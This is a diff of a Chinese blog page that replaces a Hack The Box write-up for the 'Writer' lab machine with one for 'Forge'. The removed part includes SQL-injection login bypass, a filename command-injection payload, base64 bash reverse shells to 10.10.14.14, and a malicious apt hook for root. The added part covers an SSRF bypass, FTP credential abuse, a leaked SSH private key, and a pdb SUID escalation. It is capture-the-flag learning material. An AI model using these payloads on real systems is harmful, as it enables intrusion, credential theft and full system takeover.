@@ -18,7 +18,7 @@
   <meta name="author" content="John Doe">
   <meta name="keywords" content="">
   
-  <title>Write - Crush&#39;s Blog</title>
+  <title>Forge - Crush&#39;s Blog</title>
 
   <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
 
@@ -179,7 +179,7 @@
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
           <div class="page-header text-center fade-in-up">
-            <span class="h2" id="subtitle" title="Write">
+            <span class="h2" id="subtitle" title="Forge">
               
             </span>
 
@@ -189,8 +189,8 @@
   
     <span class="post-meta">
       <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2021-10-18 15:38" pubdate>
-        2021年10月18日 下午
+      <time datetime="2021-10-20 19:43" pubdate>
+        2021年10月20日 晚上
       </time>
     </span>
   
@@ -201,7 +201,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      923 字
+      968 字
     </span>
   
 
@@ -211,7 +211,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      15
+      14
        分钟
     </span>
   
@@ -241,163 +241,86 @@
         <div class="py-5" id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">Write</h1>
+            <h1 style="display: none">Forge</h1>
             
             <div class="markdown-body">
-              <hr>
-<pre><code>nmap -A -sS -sV 10.10.11.101 22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) 
-| ssh-hostkey:  
-|   3072 98:20:b9:d0:52:1f:4e:10:3a:4a:93:7e:50:bc:b8:7d (RSA) 
-|   256 10:04:79:7a:29:74:db:28:f9:ff:af:68:df:f1:3f:34 (ECDSA) 
-|_  256 77:c4:86:9a:9f:33:4f:da:71:20:2c:e1:51:10:7e:8d (ED25519) 
-80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu)) 
-|_http-title: Story Bank | Writer.HTB 
-139/tcp open  netbios-ssn Samba smbd 4.6.2 
-445/tcp open  netbios-ssn Samba smbd 4.6.2
-</code></pre>
-<p><img src="https://pic.imgdb.cn/item/616d35282ab3f51d91bc8801.jpg" srcset="/img/loading.gif" lazyload></p>
-<p>扫描器干他</p>
+              <p>curl 10.10.11.111  火狐进不去，curl看一下，发现了一个域名，<br>把他添加到hosts文件里</p>
 <hr>
-<pre><code>gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e -t 100 -u http://10.10.11.101/
+<pre><code>echo &quot;10.10.11.111 forge.htb&quot; &gt;&gt; /etc/hosts
+</code></pre>
+<p><img src="https://i.loli.net/2021/10/20/9nvJKQReBXVdbhm.png" srcset="/img/loading.gif" lazyload></p>
+<p>打开网页长这样<br><img src="https://i.loli.net/2021/10/20/MeHnTIcZsqYyECf.png" srcset="/img/loading.gif" lazyload></p>
+<p>有一个上传的地方，抓包，尝试抓包上传一下。<br><img src="https://i.loli.net/2021/10/20/zshCMjN9A4f8Toe.png" srcset="/img/loading.gif" lazyload><br><img src="https://i.loli.net/2021/10/20/wFxkscfQ2LhECl3.png" srcset="/img/loading.gif" lazyload></p>
+<p>上传的一张图片显示是上传成功，传一个php文件，就不能访问了，也不知道这个能解析什么， 尝试目录扫描和子域名扫描，因为这个网站不是还有一个upload from url吗</p>
+<hr>
+<pre><code>wfuzz -c -u &quot;http://forge.htb/&quot; -H &quot;Host:FUZZ.forge.htb&quot; -w /usr/share/amass/wordlists/subdomains-top1mil-5000.txt
 </code></pre>
 <hr>
-<pre><code>http://10.10.11.101/static/   一个目录遍历 http://10.10.11.101/administrative   一个后台，好像也不是cms ，这种条条框框的用弱口令和注入测一下
+<pre><code>gobuster vhost -u forge.htb -w /usr/share/amass/wordlists/subdomains-top1mil-5000.txt
 </code></pre>
-<p>登录哪里抓包，跑到一个注入，登录框的注入，一般应该还有万能密码登录</p>
+<p>扫到一个admin.forge.htb<br><img src="https://i.loli.net/2021/10/20/EZRtagLr4uzOTXv.png" srcset="/img/loading.gif" lazyload></p>
 <hr>
-<pre><code>跑个万能密码的字典应该也能进 admin &#39; or &#39;1&#39;=&#39;1 admin &#39; or &#39;1&#39;=&#39;1 登录成功
+<pre><code>echo &quot;10.10.11.111 admin.forge.htb&quot; &gt;&gt; /etc/hosts
 </code></pre>
-<p><img src="https://pic.imgdb.cn/item/616d352c2ab3f51d91bc8a96.jpg" srcset="/img/loading.gif" lazyload></p>
-<p>sqlmap说有6个字段， test’ union select 1,2,3,4,5,6;–+爆显示位<br><img src="https://pic.imgdb.cn/item/616d35312ab3f51d91bc8d3c.jpg" srcset="/img/loading.gif" lazyload></p>
-<p>读取/etc/passwd文件<br><img src="https://pic.imgdb.cn/item/616d35332ab3f51d91bc8ef8.jpg" srcset="/img/loading.gif" lazyload></p>
-<p>进入后台翻一下，发现有上传文件的功能，但是只能上传图片，</p>
+<p>访问一下，只允许本地访问，尝试迪哥教的加一个X-Forwarded-For:127.0.0.1 看看能不能绕过<br><img src="https://i.loli.net/2021/10/20/IQGZsJe8DL9xNvz.png" srcset="/img/loading.gif" lazyload></p>
+<p>然鹅。。<br><img src="https://i.loli.net/2021/10/20/mK1CQxPMpksvVBF.png" srcset="/img/loading.gif" lazyload></p>
+<p>尝试把他子域上传上去，黑名单，还好不是白名单，尝试大小写绕过<br><img src="https://i.loli.net/2021/10/20/zFrXCGkBgoqYhnl.png" srcset="/img/loading.gif" lazyload></p>
+<p>改了一个大写，成功了，访问不了，curl 还是原来页面，wp的绕过成功了 <a target="_blank" rel="noopener" href="http://admin.forge.htb/">http://aDmin.forGe.hTb/</a><br><img src="https://i.loli.net/2021/10/20/E1sivHjJMlCkYwp.png" srcset="/img/loading.gif" lazyload></p>
+<p>访问图像损坏，curl看报文/announcement<br><img src="https://i.loli.net/2021/10/20/g3dXhHfBm97142t.png" srcset="/img/loading.gif" lazyload></p>
 <hr>
-<pre><code>用kali做一个图片马  
-echo -n &#39;/bin/bash -c &quot;/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.14/1234 0&gt;&amp;1&quot;&#39; | base64 
-得到一个base64 L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTQvMTIzNCAwPiYxIg==  
-
-touch &#39;1.jpg; `echo L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTQvMTIzNCAwPiYxIg==| base64 -d | bash`;&#39;  
-file:///var/www/writer.htb/writer/static/img/1.jpg; `echo L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTQvMTIzNCAwPiYxIg==| base64 -d | bash`;#
-</code></pre>
-<p><img src="https://pic.imgdb.cn/item/616d35392ab3f51d91bc9273.jpg" srcset="/img/loading.gif" lazyload></p>
-<p>在home下ls发现两个账户 john kyle</p>
-<hr>
-<pre><code>九头蛇跑密码 
-hydra -l kyle -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-50.txt 10.10.11.101 ssh
+<pre><code>http://aDmin.forGe.hTb/announcement
 </code></pre>
 <hr>
-<pre><code>进数据库拿kyle的hash,先拿数据库的账号和密码 
-cd /etc/mysql 
-cat mariadb.cnf  
-拿到密码登录
-mysql user = djangouser 
-password = DjangoSuperPassword
-</code></pre>
-<p><img src="https://pic.imgdb.cn/item/616d353d2ab3f51d91bc9679.jpg" srcset="/img/loading.gif" lazyload></p>
-<hr>
-<pre><code>mysql -u djangouser -h 127.0.0.1 -p DjangoSuperPassword     
-show databases; 
-use dev; 
-show tables; SELECT * FROM auth_user; 
-拿到hash值去hashcat或john爆破
-忘了截图了。。
+<pre><code>好东西来了，给了一个ftp帐密，这里是一个ssrf，利用一下 user:heightofsecurity123!
 </code></pre>
 <hr>
-<pre><code>kyle 
-marcoantonio 
-ssh kyle@10.10.11.101
+<pre><code>翻译: 一个我nternal FTP服务器已经创建了凭据用户：heightofsecuirty123！ /upload 端点现在支持用于上传表单 url 的 ftp、ftps、http 和 https 协议 /upload 端点已经被配置为简单的上传脚本，并且为了上传图像，可以简单地传递一个带有 ?u= 的 url。 以免尝试通过将 get param 中的 ftp url 传递给 admin vhost 来访问 ftp
 </code></pre>
-<p><img src="https://pic.imgdb.cn/item/616d35412ab3f51d91bc9a6c.jpg" srcset="/img/loading.gif" lazyload></p>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><hr>
-<pre><code>准备两个脚本
-python -m SimpleHTTPServer 80 
-传上去
+<p><img src="https://i.loli.net/2021/10/20/pSwnc683gHtK1rD.png" srcset="/img/loading.gif" lazyload></p>
+<hr>
+<pre><code>利用 
+http://ADMIN.FORGE.HTB/upload?u=ftp://user:heightofsecurity123!@FORGE.HTB
+</code></pre>
+<p><img src="https://i.loli.net/2021/10/20/AUKyN8gWt742Dkr.png" srcset="/img/loading.gif" lazyload></p>
+<p>读/.ssh/id_rsa</p>
+<hr>
+<pre><code>-----BEGIN OPENSSH PRIVATE KEY----- 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 shlLupso7WoS0AAAAKdXNlckBmb3JnZQE= -----END OPENSSH PRIVATE KEY-----
 </code></pre>
 <hr>
-<pre><code>#!/bin/bash
-# Localize these.
-bash -i &amp;&gt;/dev/tcp/10.10.14.14/4444 0&gt;&amp;1
-INSPECT_DIR=/var/spool/filter
-SENDMAIL=/usr/sbin/sendmail
-
-# Get disclaimer addresses
-DISCLAIMER_ADDRESSES=/etc/postfix/disclaimer_addresses
-
-# Exit codes from &lt;sysexits.h&gt;
-EX_TEMPFAIL=75
-EX_UNAVAILABLE=69
-
-# Clean up when done or when aborting.
-trap &quot;rm -f in.$$&quot; 0 1 2 3 15
-
-# Start processing.
-cd $INSPECT_DIR || &#123; echo $INSPECT_DIR does not exist; exit
-$EX_TEMPFAIL; &#125;
-
-cat &gt;in.$$ || &#123; echo Cannot save mail to file; exit $EX_TEMPFAIL; &#125;
-
-# obtain From address
-from_address=`grep -m 1 &quot;From:&quot; in.$$ | cut -d &quot;&lt;&quot; -f 2 | cut -d &quot;&gt;&quot; -f 1`
-
-if [ `grep -wi ^$&#123;from_address&#125;$ $&#123;DISCLAIMER_ADDRESSES&#125;` ]; then
-  /usr/bin/altermime --input=in.$$ \
-                   --disclaimer=/etc/postfix/disclaimer.txt \
-                   --disclaimer-html=/etc/postfix/disclaimer.txt \
-                   --xheader=&quot;X-Copyrighted-Material: Please visit http://www.company.com/privacy.htm&quot; || \
-                    &#123; echo Message content rejected; exit $EX_UNAVAILABLE; &#125;
-fi
-
-$SENDMAIL &quot;$@&quot; &lt;in.$$
-
-exit $?
+<pre><code>成功读到， chmod 600 user_id_rsa ssh -i user_id_rsa user@10.10.11.111         用户用的ftp的用户名 连接成功
 </code></pre>
-<p>这是修改原文件/etc/postfix/disclaimer后得到的脚本，这里只是举个例子，该靶机无法使用bash和sh进行反弹 shell。可以使用python或socat进行getshell，由于懒，我就不修改了 查看文件/etc/postfix/disclaimer_addresses得到邮箱<a href="mailto:&#107;&#121;&#x6c;&#101;&#64;&#x77;&#114;&#105;&#116;&#x65;&#x72;&#x2e;&#x68;&#x74;&#x62;">&#107;&#121;&#x6c;&#101;&#64;&#x77;&#114;&#105;&#116;&#x65;&#x72;&#x2e;&#x68;&#x74;&#x62;</a> 使用该邮箱编写脚本</p>
+<p>sudo -l 发现一个python文件</p>
 <hr>
-<pre><code>import smtplib
-host = &#39;127.0.0.1&#39;
-port = 25
-
-sender_email = &quot;kyle@writer.htb&quot;
-receiver_email = &quot;kyle@writer.htb&quot;
-message = &quot;&quot;&quot;\
-Subject: Hi there
-
-Test_python_sender.&quot;&quot;&quot;
-
-try:
-    server = smtplib.SMTP(host, port)
-    server.ehlo()
-    server.sendmail(sender_email, receiver_email, message)
-except Exception as e:
-    print(e)
-finally:
-    server.quit()
+<pre><code>#!/usr/bin/env python3 import socket import random import subprocess import pdb  port = random.randint(1025, 65535)  try:     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)     sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)     sock.bind((&#39;127.0.0.1&#39;, port))     sock.listen(1)     print(f&#39;Listening on localhost:&#123;port&#125;&#39;)     (clientsock, addr) = sock.accept()     clientsock.send(b&#39;Enter the secret passsword: &#39;)     if clientsock.recv(1024).strip().decode() != &#39;secretadminpassword&#39;:         clientsock.send(b&#39;Wrong password!\n&#39;)     else:         clientsock.send(b&#39;Welcome admin!\n&#39;)         while True:             clientsock.send(b&#39;\nWhat do you wanna do: \n&#39;)             clientsock.send(b&#39;[1] View processes\n&#39;)             clientsock.send(b&#39;[2] View free memory\n&#39;)             clientsock.send(b&#39;[3] View listening sockets\n&#39;)             clientsock.send(b&#39;[4] Quit\n&#39;)             option = int(clientsock.recv(1024).strip())             if option == 1:                 clientsock.send(subprocess.getoutput(&#39;ps aux&#39;).encode())             elif option == 2:                 clientsock.send(subprocess.getoutput(&#39;df&#39;).encode())             elif option == 3:                 clientsock.send(subprocess.getoutput(&#39;ss -lnt&#39;).encode())             elif option == 4:                 clientsock.send(b&#39;Bye\n&#39;)                 break except Exception as e:     print(e)     pdb.post_mortem(e.__traceback__) finally:     quit()
 </code></pre>
-<h2 id=""><a href="#" class="headerlink" title=""></a><img src="https://pic.imgdb.cn/item/616d354c2ab3f51d91bca4bb.jpg" srcset="/img/loading.gif" lazyload></h2><pre><code>访问/home/john/.ssh文件拿到id_rsa 
-kali本地创建id_rsa复制内容 
-chmod 600 id_rsa   
-ssh -i id_rsa john@10.10.11.101
+<p>代码是硬伤，wp是这么写的</p>
+<hr>
+<pre><code>我们可以清楚地看到，如果我们设法创建了一些错误，那么我们转到 Python 调试器中的 except 处理程序， 因为我们以 root 身份运行它，所以我们可以轻松地使用系统中的 os 模块执行命令。 为此，我们需要两个 ssh 连接一个用于启动服务器，第二个用于连接到服务器。
 </code></pre>
 <hr>
-<pre><code>提权参考：
-https://www.hackingarticles.in/linux-for-pentester-apt-privilege-escalation/
+<pre><code>ssh1： sudo /usr/bin/python3 /opt/remote-manage.py ssh2： nc 127.0.0.1 输入哪里给的端口 ls  ssh1 进入pdp (Pdb) import os (Pdb) os.system(&#39;chmod u+s /bin/bash&#39;) (Pdb)exit /bin/bash -p root权限来了。在/root/root.txt找到flag
 </code></pre>
-<p><img src="https://pic.imgdb.cn/item/616d39622ab3f51d91bfd97f.jpg" srcset="/img/loading.gif" lazyload></p>
-<hr>
-<pre><code>cd /etc/apt/apt.conf.d  
-echo &#39;apt::Update::Pre-Invoke &#123;&quot;echo L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTQvMTAwODYgMD4mMSI= | base64 -d | bash&quot;&#125;;&#39;&gt; pwn 
-
-base64：
-/bin/bash -c &quot;/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.14/10086 0&gt;&amp;1&quot; 
-nc -nvlp 10086  多等会儿，root权限就来了最后一个在root下 cat root.txt就行了
-</code></pre>
-<p><img src="https://pic.imgdb.cn/item/616d396b2ab3f51d91bfe01a.jpg" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://i.loli.net/2021/10/20/ZSq3ec8vYxPnbsE.png" srcset="/img/loading.gif" lazyload></p>
 
             </div>
             <hr>
             <div>
               <div class="post-metas mb-3">
                 
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/Hack-The-Box/">Hack The Box</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/Hack-The-Box/">Hack The Box</a>
+                    
+                  </div>
                 
               </div>
               
@@ -412,9 +335,9 @@ nc -nvlp 10086  多等会儿，root权限就来了最后一个在root下 cat roo
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2021/10/20/Forge/">
+                      <a href="/2021/10/20/Bolt/">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">Forge</span>
+                        <span class="hidden-mobile">Bolt</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -422,8 +345,8 @@ nc -nvlp 10086  多等会儿，root权限就来了最后一个在root下 cat roo
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2021/10/18/Hach%20The%20Box-Seal/">
-                        <span class="hidden-mobile">Seal</span>
+                      <a href="/2021/10/18/Hach%20The%20Box-Write/">
+                        <span class="hidden-mobile">Write</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
